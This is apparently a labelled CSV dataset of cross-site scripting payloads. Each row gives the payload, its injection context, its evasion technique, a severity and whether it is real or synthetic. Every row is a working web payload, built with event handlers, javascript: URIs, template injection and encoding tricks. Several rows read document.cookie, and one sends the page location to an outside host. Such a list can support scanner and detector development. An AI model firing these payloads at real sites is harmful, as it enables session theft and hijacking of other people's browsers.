payload,context,technique,severity,length,source
<svg onclick=prompt(1)/>,tag_injection,synthetic,medium,24,synthetic
"<style>:target {color: red;}</style><font id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></font>",event_handler,none,medium,111,real
%3Csvg onclick=console.log(location.hash)%3E,tag_injection,synthetic,medium,44,synthetic
j&#97;vascript:console.log(%27XSS%27),js_uri,synthetic,medium,37,synthetic
""" onfocus=consol&#101;.log(docum&#101;nt.cooki&#101;) &#97;utofocus=""",attribute_escape,synthetic,medium,69,synthetic
"""url"": ""javascript:confirm('XSS')"",",js_uri,none,medium,35,real
<aside onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
"<svG oNmoUseEntEr=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,medium,61,synthetic
"<caption onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</caption>",event_handler,none,medium,73,real
"<style>@keyframes x{}</style><rt style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></rt>",event_handler,none,medium,97,real
"<big onmouseover=""alert(1)"">AnonKryptiQuz</big>",event_handler,none,medium,47,real
<svg onbegin=\u0061lert(1)>,tag_injection,synthetic,medium,27,synthetic
"<style>@keyframes x{}</style><multicol style=""animation-name:x"" onwebkitanimationend=""alert(1)""></multicol>",event_handler,none,medium,107,real
"<canvas draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</canvas>",event_handler,none,medium,68,real
<thead contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,59,real
<img2 onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
<BODY BACKGROUND=”javascript:alert(‘XSS’)”>,js_uri,case_variation,medium,43,real
"<textarea onmousedown=""alert(1)"">AnonKryptiQuz</textarea>",event_handler,none,medium,57,real
"self[Object.keys(self)[5]](""1"") // alert(""1"")",generic,none,medium,45,real
%3Cscript%3E/*/prompt(document.domain)%3C/script%3E,script_injection,synthetic,medium,51,synthetic
"<plaintext onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</plaintext>",event_handler,none,medium,79,real
"<listing oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,100,real
""" oNmoUseOveR=pRomPt(DocUmeNt.DomAin) """,attribute_escape,synthetic,medium,39,synthetic
"""><Svg onFocUs=ProMpt(doCumEnt.coOkiE)>",tag_injection,synthetic,medium,39,synthetic
""" ontoggle=\u0061lert(document.domain) """,attribute_escape,synthetic,medium,40,synthetic
"<video><source onerror=""javascript:javascript:alert(1)"">",event_handler,none,medium,56,real
"<xmp onmouseleave=""alert(1)"">AnonKryptiQuz</xmp>",event_handler,none,medium,48,real
"{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}",template_injection,encoding,high,128,real
"<picture onmouseleave=""alert(1)"">AnonKryptiQuz</picture>",event_handler,none,medium,56,real
<dir onpointerup=alert(1) style=display:block>AnonKryptiQuz</dir>,event_handler,none,medium,65,real
<select contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,60,real
' oNtoGglE=cOnfIrm(loCatIon.haSh) ',attribute_escape,synthetic,medium,35,synthetic
"<caption draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</caption>",event_handler,none,medium,91,real
<article onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
<scr	ipt>console.log(document.cookie)</scr	ipt>,script_injection,synthetic,medium,47,synthetic
"<video draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</video>",event_handler,none,medium,87,real
"<img src=x\x11onerror=""javascript:alert(3350)"">",event_handler,none,medium,47,real
"<style>:target {color: red;}</style><meta id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></meta>",event_handler,none,medium,111,real
"<dd onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</dd>",event_handler,none,medium,62,real
"<fieldset onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</fieldset>",event_handler,none,medium,75,real
<custom tags onpointerdown=alert(1) style=display:block>AnonKryptiQuz</custom tags>,event_handler,none,medium,83,real
"<div draggable=""true"" contenteditable>drag me</div><multicol ondrop=alert(1) contenteditable>drop here</multicol>",event_handler,none,medium,113,real
"<th onmouseup=""alert(1)"">AnonKryptiQuz</th>",event_handler,none,medium,43,real
<svG oNloAd=AleRt(DocUmeNt.CooKie)/>,tag_injection,synthetic,medium,36,synthetic
<textarea onpointerover=alert(1) style=display:block>AnonKryptiQuz</textarea>,event_handler,none,medium,77,real
' onmous&#101;ov&#101;r=consol&#101;.log(1) ',attribute_escape,synthetic,medium,45,synthetic
"xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",attribute_escape,comment_injection,medium,42,real
"<rb oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</rb>",event_handler,none,medium,67,real
<ScripT>alert(1234)</ScRipT>,script_injection,case_variation,medium,28,real
"<body draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</body>",event_handler,none,medium,86,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image id=x style=""position:absolute;"" onanimationcancel=""print()""></image>",event_handler,none,low,179,real
<output onblur=alert(1) tabindex=1 id=x></output><input autofocus>,event_handler,none,medium,66,real
"<h1 draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</h1>",event_handler,none,medium,80,real
"<BODY ONLOAD=alert(""XSS"")>",event_handler,case_variation,medium,26,real
""" oNbeGin=alErt(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape,synthetic,medium,48,synthetic
"<div draggable=""true"" contenteditable>drag me</div><address ondragover=alert(1) contenteditable>drop here</address>",event_handler,none,medium,115,real
"<content draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</content>",event_handler,none,medium,90,real
"<style>@keyframes slidein {}</style><output style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></output>",event_handler,none,medium,172,real
"""><Svg onBegIn=ProMpt(1)>",tag_injection,synthetic,medium,25,synthetic
"<ul onmouseout=""alert(1)"">AnonKryptiQuz</ul>",event_handler,none,medium,44,real
"<style oncontextmenu=""alert(1)"">AnonKryptiQuz</style>",event_handler,none,medium,53,real
<x%2Fonxxx=1,event_handler,url_encoding,low,12,real
' onload=console.log(1) ',attribute_escape,synthetic,medium,25,synthetic
"<dialog onmousemove=""alert(1)"">AnonKryptiQuz</dialog>",event_handler,none,medium,53,real
<svg/onload=location=location.hash.substr(1)>#javascript:alert(1),event_handler,none,medium,65,real
"<img \x11src=x onerror=""javascript:alert(7333)"">",event_handler,none,medium,48,real
"<div draggable=""true"" contenteditable>drag me</div><iframe2 ondragover=alert(1) contenteditable style=display:block>drop here</iframe2>",event_handler,none,medium,135,real
""" oNmoUseOveR=cOnfIrm(doCumEnt.doMaiN) """,attribute_escape,synthetic,medium,40,synthetic
"<style>:target {transform: rotate(180deg);}</style><listing id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></listing>",event_handler,none,medium,132,real
<svg onfocus=prompt(docum&#101;nt.dom&#97;in)/>,tag_injection,synthetic,medium,47,synthetic
<scRipT>//prOmpT(dOcuMenT.cOokIe)</sCriPt>,script_injection,synthetic,medium,42,synthetic
"<summary draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</summary>",event_handler,none,medium,67,real
<a autofocus onfocusin=alert(1) href></a>,event_handler,none,medium,41,real
<b onfocusout=alert(1) tabindex=1 id=x></b><input autofocus>,event_handler,none,medium,60,real
"<datalist oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,102,real
%3Cscript%3E//prompt(document.cookie)%3C/script%3E,script_injection,synthetic,medium,50,synthetic
"<object onError object onError=""javascript:javascript:alert(5105)""></object onError>",event_handler,none,medium,84,real
"<IMG SRC=x onmouseup=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,60,real
<svg><set onbegin=alert(1) attributename=x dur=1s>,event_handler,none,medium,50,real
"<style>@keyframes x{}</style><animatemotion style=""animation-name:x"" onanimationstart=""alert(1)""></animatemotion>",event_handler,none,medium,113,real
"<p style=""height:100px"" onwheel=""self['al'+'ert'](self['ev'+'al']('docu'+'ment.coo'+'kie'))""></p>",event_handler,none,low,97,real
"s&#101;tTim&#101;out(""&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))"",0)",dom_sink,synthetic,medium,80,synthetic
"<embed draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</embed>",event_handler,none,medium,66,real
"<audio onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</audio>",event_handler,none,medium,72,real
"<style>@keyframes x{}</style><xmp style=""animation-name:x"" onwebkitanimationend=""alert(1)""></xmp>",event_handler,none,medium,97,real
"<image draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</image>",event_handler,none,medium,88,real
"<style>:target {transform: rotate(180deg);}</style><frame id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></frame>",event_handler,none,medium,128,real
<img src=javascript:alert(&quot;XSS&quot;)>,js_uri,none,medium,43,real
"<animatemotion onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</animatemotion>",event_handler,none,medium,88,real
' onmous&#101;&#101;nt&#101;r=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,medium,71,synthetic
"""`'><script>\xE2\x80\x8Bjavascript:alert(0166)</script>",script_injection,none,medium,55,real
<script>debugger;</script>,script_injection,none,low,26,real
<form id=x tabindex=1 onbeforeactivate=alert(1)></form>,event_handler,none,medium,55,real
"<style>:target {transform: rotate(180deg);}</style><menuitem id=x style=""transition:transform 2s"" ontransitionrun=print()></menuitem>",event_handler,none,low,133,real
"<track onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</track>",event_handler,none,medium,63,real
<script>/x/prompt('XSS')</script>,script_injection,synthetic,medium,33,synthetic
"<param onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</param>",event_handler,none,medium,72,real
%3Csvg onmouseover=alert(document.domain)%3E,tag_injection,synthetic,medium,44,synthetic
"<div draggable=""true"" contenteditable>drag me</div><ruby ondragover=alert(1) contenteditable style=display:block>drop here</ruby>",event_handler,none,medium,129,real
<table onpointerdown=alert(1) style=display:block>AnonKryptiQuz</table>,event_handler,none,medium,71,real
""" oNtoGglE=cOnsOle.loG(dOcuMenT.dOmaIn) """,attribute_escape,synthetic,medium,41,synthetic
<scr	ipt>confirm`'XSS'`</scr	ipt>,script_injection,synthetic,medium,33,synthetic
"<pre oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</pre>",event_handler,none,medium,58,real
<input2 onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</input2><input value=clickme>,event_handler,none,medium,112,real
"<dt onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</dt>",event_handler,none,medium,65,real
<div onpointerup=alert(1) style=display:block>AnonKryptiQuz</div>,event_handler,none,medium,65,real
<svG oNmoUseOveR=aLerT(dOcuMenT.cOokIe)/>,tag_injection,synthetic,medium,41,synthetic
"<div id=d><x xmlns=""><iframe onload=alert(97)""></div>",event_handler,none,medium,53,real
<svg onload=confirm(document.domain)>,tag_injection,synthetic,medium,37,synthetic
"<center onmouseleave=""alert(1)"">AnonKryptiQuz</center>",event_handler,none,medium,54,real
<iframe id=x tabindex=1 onactivate=alert(1)></iframe>,event_handler,none,medium,53,real
"astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';",dom_sink,none,medium,62,real
""" on&#101;rror=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,medium,63,synthetic
"""><svg onbegin=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,54,synthetic
<script id=x tabindex=1 onfocus=alert(1)></script>,script_injection,none,medium,50,real
“javascript:var{a:onerror}={a:alert};throw%20document.cookie”,js_uri,url_encoding,high,61,real
<svg onmouseenter=console.log(1)>,tag_injection,synthetic,medium,33,synthetic
"<picture onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</picture>",event_handler,none,medium,67,real
<marquee onstart=alert(1)>AnonKryptiQuz</marquee>,event_handler,none,medium,49,real
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",attribute_escape,comment_injection|case_variation,medium,78,real
"<audio2 onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</audio2>",event_handler,none,medium,87,real
"""><svg onmouseenter=\u0061lert(document.domain)>",tag_injection,synthetic,medium,48,synthetic
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,synthetic,medium,46,synthetic
<ruby onpointerdown=alert(1) style=display:block>AnonKryptiQuz</ruby>,event_handler,none,medium,69,real
""" onfocus=alert(document.cookie) autofocus=""",attribute_escape,synthetic,medium,44,synthetic
<hr id=x tabindex=1 onbeforeactivate=alert(1)></hr>,event_handler,none,medium,51,real
<IMG SRC=jAVasCrIPt:alert('AnonKryptiQuz')>,js_uri,case_variation,medium,43,real
"<frameset draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</frameset>",event_handler,none,medium,69,real
"""><a/\AnonKryptiQuz=""%26quot;x%26quot;""href='%01javascript:/*%b1*/;location.assign(""//hackerone.com/stealthy?x=""+location)'>Click",event_handler,comment_injection|url_encoding,low,129,real
"<del onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</del>",event_handler,none,medium,65,real
"setTimeout(%22console.log(String.fromCharCode(88,83,83))%22,0)",dom_sink,synthetic,medium,62,synthetic
<svG oNfoCus=alErt(doCumEnt.coOkiE)>,tag_injection,synthetic,medium,36,synthetic
<svg onmouseover=confirm('XSS')/>,tag_injection,synthetic,medium,33,synthetic
"<map onmousemove=""alert(1)"">AnonKryptiQuz</map>",event_handler,none,medium,47,real
"<img src=""x` `<script>javascript:alert(1)</script>""` `>",script_injection,none,medium,55,real
"<keygen draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</keygen>",event_handler,none,medium,70,real
"""%3E%3Csvg onmouseover=alert(1)%3E",tag_injection,synthetic,medium,34,synthetic
<form onpointerenter=alert(1) style=display:block>AnonKryptiQuz</form>,event_handler,none,medium,70,real
<canvas onpointerover=alert(1) style=display:block>AnonKryptiQuz</canvas>,event_handler,none,medium,73,real
<map onpointerout=alert(1) style=display:block>AnonKryptiQuz</map>,event_handler,none,medium,66,real
<font onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</font><input value=clickme>,event_handler,none,medium,99,real
"""><Svg onTogGle=coNsoLe.Log(1)>",tag_injection,synthetic,medium,31,synthetic
"<s ondblclick=""alert(1)"">AnonKryptiQuz</s>",event_handler,none,medium,42,real
<script>alert`document.cookie`</script>,script_injection,synthetic,medium,39,synthetic
<svg onerror=console.log('XSS')>,tag_injection,synthetic,medium,32,synthetic
"&lt;IMG STYLE=\""xss&#58;expr/*XSS*/ession(alert('XSS'))\""&gt;",generic,html_entity|comment_injection,medium,61,real
"<script\x20type=""text/javascript"">javascript:alert(5176);</script>",script_injection,none,medium,66,real
"<br onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</br>",event_handler,none,medium,66,real
<small onpointerout=alert(1) style=display:block>AnonKryptiQuz</small>,event_handler,none,medium,70,real
<input type=radio id=x onfocusin=alert(1)>,event_handler,none,medium,42,real
"""><Svg onTogGle=alErt('XSS')>",tag_injection,synthetic,medium,29,synthetic
"<style>@keyframes x{}</style><pre style=""animation-name:x"" onwebkitanimationend=""alert(1)""></pre>",event_handler,none,medium,97,real
"<! foo=""[[[Inception]]""><x foo=""]foo><script>javascript:alert(1)</script>"">",script_injection,none,medium,75,real
<svg onerror=console.log(%27XSS%27)>,tag_injection,synthetic,medium,36,synthetic
<html ontouchstart=alert(1)>,event_handler,none,medium,28,real
<command onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</command><input value=clickme>,event_handler,none,medium,105,real
%3Csvg onmouseover=prompt('XSS')%3E,tag_injection,synthetic,medium,35,synthetic
<svG oNmoUseEntEr=ConFirM(dOcuMenT.cOokIe)>,tag_injection,synthetic,medium,43,synthetic
"<svg ontoggl&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,75,synthetic
